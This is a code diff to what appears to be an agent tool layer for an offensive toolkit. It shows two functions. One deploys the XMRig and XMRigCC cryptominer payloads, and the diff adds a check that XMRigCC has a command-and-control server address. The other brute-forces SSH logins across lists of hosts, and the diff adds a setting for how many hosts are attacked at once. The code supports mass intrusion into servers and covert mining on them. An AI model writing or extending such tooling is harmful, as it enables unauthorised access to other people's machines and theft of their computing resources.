@@ -530,11 +530,16 @@ def _tool_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
             variables["tls"] = str(cfg.tls).lower()
 
     missing = []
-    if payload_id in {"xmrig", "xmrigcc"}:
+    if payload_id == "xmrig":
         if not variables.get("pool"):
             missing.append("pool")
         if not variables.get("wallet"):
             missing.append("wallet")
+    elif payload_id == "xmrigcc":
+        # xmrigcc also requires a C&C server address (cc_server).
+        for k in ("pool", "wallet", "cc_server"):
+            if not variables.get(k):
+                missing.append(k)
     if missing:
         return {
             "error": f"payload {payload_id!r} missing required variables: {', '.join(missing)}. Run set_wallet or provide them in variables.",
@@ -712,6 +717,7 @@ def _tool_crack_ssh(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     cfg = load_config()
     crack_cfg = getattr(cfg, "crack", None)
     concurrency = int(args.get("concurrency") or getattr(crack_cfg, "concurrency", 8))
+    host_concurrency = int(args.get("host_concurrency") or getattr(crack_cfg, "host_concurrency", 32))
     timeout_s = float(args.get("timeout") or getattr(crack_cfg, "timeout_s", 6.0))
     max_attempts = args.get("max_attempts")
     if max_attempts is not None:
@@ -763,7 +769,7 @@ def _tool_crack_ssh(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
         for ip, port in hosts
     ]
 
-    results = asyncio.run(crack_targets(targets, concurrency=concurrency))
+    results = asyncio.run(crack_targets(targets, concurrency=concurrency, host_concurrency=host_concurrency))
 
     for res in results:
         if res.success:
